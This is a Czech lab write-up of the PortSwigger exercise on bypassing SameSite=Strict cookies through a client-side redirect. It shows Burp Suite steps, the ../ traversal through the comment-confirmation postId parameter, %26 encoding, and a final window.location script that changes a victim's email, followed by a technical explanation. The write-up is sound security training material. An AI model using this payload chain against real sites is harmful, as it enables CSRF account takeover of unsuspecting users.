# PortSwigger Lab: SameSite Strict bypass via client-side redirect

## O čem tenhle lab byl a co jsem dělal krok za krokem

### 1. Přihlášení a kontrola cookies v Burp Suite
* Přihlásil jsem se do aplikace jako **wiener** s heslem **peter** a aktualizoval jsem e-mail na `wiener@abnormal-user.net`.
* Hned nato jsem šel do HTTP history v Burp Suite a kliknul na `POST /login`, kde jsem v hlavičce našel atributy `Secure`, `HttpOnly` a `SameSite=Strict`.
* **Co to znamená v krátkosti:**
  * `Secure` – cookie se posílá jen přes šifrované HTTPS.
  * `HttpOnly` – JavaScript v prohlížeči se k ní nedostane (ochrana proti XSS).
  * `SameSite=Strict` – nejpřísnější ochrana, která blokuje odeslání cookie, když uživatel přejde z cizího webu (což normálně zastaví klasické CSRF).

### 2. Zkoumání změny e-mailu v Repeateru
* Pořád v HTTP history jsem kliknul na `POST /my-account/change-email` a poslal to do Repeateru. Dal jsem `Send` a ukázalo se `HTTP/1.1 302 Found`.
* Pak jsem v requestu kliknul pravým tlačítkem na `Change request method`, dal `Send` a v odpovědi se mi ukázalo: 
  `GET /my-account/change-email?email=wiener%40abnormal-user.net&submit=1`
* **Proč se mi to tam ukázalo:** Ukázalo se to proto, že požadavek šel přehodit na `GET` metodu a parametry se přenesly přímo do URL řádku.

### 3. Hledání slabiny přes komentáře na blogu
* Vrátil jsem se zpátky na stránku, sjel na hlavní zdi dolů na blog a vybral si nějaký příspěvek, kde jsem kliknul na `View post`.
* Do komentářů jsem vyplnil:
  * **Comment:** `foodbar`
  * **Name:** `foodbar`
  * **Email:** `foodbar@foodbar.com`
  * **Website:** `https://foodbar.com`
* Kliknul jsem na `Post comment`, v HTTP history v Burpu našel požadavek `POST /post/comment` a rozkliknul si jeho odpověď (což je to, co jsem měl na fotce).
* Z té odpovědi jsem si zkopíroval cestu `/post/comment/mattion?postID=6`.

### 4. Zkoušení různých payloadů
* **Payload 1:** Vzal jsem `/post/comment/mattion?postID=6`, šel na stránku, umazal z URL doménu labu (nechal jsem jen začátek a konec), vložil tam tento payload a hned na mě vyskočilo *Thank you for your comment!*.
* **Payload 2:** Vytvořil jsem `/post/comment/confirmation?postId=my-account/`, udělal to stejné (zkrátil v URL a vložil), ale vyskočilo mi **"NOT FOUND"**.
* **Payload 3:** Přidal jsem tečky -> `/post/comment/confirmation?postId=../my-account/`. Udělal jsem to stejné, hned po enteru mě tohodilo do `my-account`, což potvrdilo, že cesta přes `../` funguje.

### 5. Ladění a kódování znaků (Payload 4 a 5)
* **Payload 4:** Vzal jsem z Repeateru požadavek `GET /my-account/change-email?email=wiener%40abnormal-user.net&submit=1` a spojil ho s tou fungující cestou. Vzniklo: 
  `/post/comment/confirmation?postId=../my-account/change-email?email=wienerschnitzel%40abnormal-user.net&submit=1`. 
  Když jsem to vložil do URL a dal enter, napsalo to chybu **"Missing parameter: 'submit'"**.
* **Oprava znaku `&`:** Znak `&` v URL dělal neplechu, protože rozbíjel parametry. Šel jsem v Repeateru nahoru do **Decoderu**, napsal tam `&`, v *Encode as* vybral **URL** a vypadlo mi `%26`.
* **Payload 5 (Finální funkční):** 
  `/post/comment/confirmation?postId=../my-account/change-email?email=wienerschnitzel%40abnormal-user.net%26submit=1`. 
  Když jsem to vložil do URL a dal enter, hodilo mě to do `my-account` a e-mail se úspěšně změnil na `wienerschnitzel@abnormal-user.net`.

### 6. Sestavení finálního exploitu (Payload 6)
* Nakonec jsem k tomu všemu dopsal JavaScriptový příkaz `window.location` s adresou labu a značky `<script>`, abych to mohl poslat oběti.
* Nejprve to vypadalo takto:
  ```html
  <script>
  window.location = "[https://0ab400290419225380de038c00c400ed.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=wienerschnitzel%40abnormal-user.net%26submit=1](https://0ab400290419225380de038c00c400ed.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=wienerschnitzel%40abnormal-user.net%26submit=1)";
  </script>

# Pak jsem jméno wienerschnitzel přepsal na evil a vytvořil finální payload, který jsem šel vložit na exploit server¨

 <script>
 window.location = "https://0ab400290419225380de038c00c400ed.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=evil%40abnormal-user.net%26submit=1";
</script>

--Nakonec stačilo kliknout na Deliver exploit to victim.

# Technické vysvětlení

# 1. Atributy Cookies (Secure, HttpOnly, SameSite=Strict)
Když se přihlásíš do aplikace, server ti pošle session cookie. Ta určuje, že jsi to ty. V hlavičce Set-Cookie měla tyto atributy:

Secure: Zaručuje, že prohlížeč tuto cookie odešle pouze přes šifrované spojení (HTTPS). Zabraňuje to odposlechu na nezabezpečených sítích (HTTP).

HttpOnly: Zakazuje klientským skriptům (například JavaScriptu přes document.cookie) přístup k této cookie. Jde o hlavní ochranu proti útokům typu XSS (Cross-Site Scripting), kdy by útočník mohl session cookie ukrást.

SameSite=Strict: Nejpřísnější nastavení ochrany proti CSRF. Prohlížeč v tomto režimu nikdy nepřibalí cookie k požadavkům, které přicházejí z cizí webové stránky (například z tvého Exploit serveru). To znamená, že klasický útok, kdy cizí stránka na pozadí zavolá tvůj účet, je prohlížečem úplně zablokován.

# 2. Proč zafungovala změna metody z POST na GET v Repeateru?
Původní stav: Akce na změnu e-mailu běžně přijímala data přes metodu POST.

Změna na GET: Když jsi v Repeateru přinutil požadavek běžet jako GET, parametry se přestaly posílat v těle požadavku (body) a přesunuly se přímo do URL řádku (tzv. query string: ?email=...&submit=1).

Technický důsledek: Aplikace byla navržena tak benevolentně, že endpoint pro změnu e-mailu akceptoval data i z GET požadavku, což otevřelo dveře k tomu, aby se celá akce dala vyvolat obyčejným odkazem nebo přesměrováním v prohlížeči.

# 3. Zranitelnost přesměrování na straně klienta (Client-Side Redirect / DOM-based)
Během testování komentářů jsi narazil na skript, který zpracovával potvrzení odeslání komentáře:

Stránka po odeslání komentáře prováděla přesměrování podle parametru v URL (v kódu jsi viděl funkci zpracovávající cestu typu redirectOnConfirmation(...) nebo podobné chování na základě postId).

Cesta ../ (Directory Traversal): Zjistil jsi, že když do parametru postId vložíš ../, dokážeš "vyskočit" o úroveň výš v adresářové struktuře aplikace. Z adresy /post/comment/confirmation?postId=... jsi tímto trikem dokázal nasměrovat prohlížeč na /my-account/change-email.

# 4. Problém se znakem & a URL kódování (%26)
Když se v URL adrese předává víc parametrů za sebou (např. email=... a submit=1), používá se k jejich oddělení znak ampersand (&).

Proč nastala chyba ("Missing parameter: 'submit'"): Pokud vložíš holý znak & do URL odkazu, který se dál zpracovává jako součást jiného parametru (v našem případě uvnitř postId=../my-account/change-email?email=...&submit=1), prohlížeč nebo server si myslí, že & ukončuje celý postId a zbytek bere jako samostatný požadavek. Tím se ztratil parametr submit.

Řešení přes Decoder: Pomocí URL kódování se speciální znaky převádějí na bezpečný formát, kterému server rozumí a nezamění je za řídicí syntaxi URL. Znak & se zakódoval jako %26. Díky tomu zůstal celý řetězec pohromadě jako jedna platná hodnota parametru postId.

# 5. Jak fungoval finální útok (Zřetězení zranitelností)
Finální exploit spojil všechny tyto chyby do jednoho funkčního řetězce:

Oběť navštívila tvůj Exploit server, kde se spustil JavaScript s příkazem window.location = "...".

Prohlížeč oběti byl přesměrován na legitimní stránku labu, ale s podstrčenou cestou využívající ../ k úniku do administrace účtu (/my-account/change-email).

Protože šlo o běžnou navigaci (přesměrování na straně klienta / GET požadavek), prohlížeč přibalil k požadavku platnou cookies oběti (čímž jsme obešli ochranu SameSite=Strict).

Aplikace požadavek přijala, zpracovala skrze zranitelný endpoint, pomocí zakódovaného %26 správně přečetla všechny parametry a změnila e-mail oběti na adresu útočníka (evil), aniž by oběť cokoliv tušila.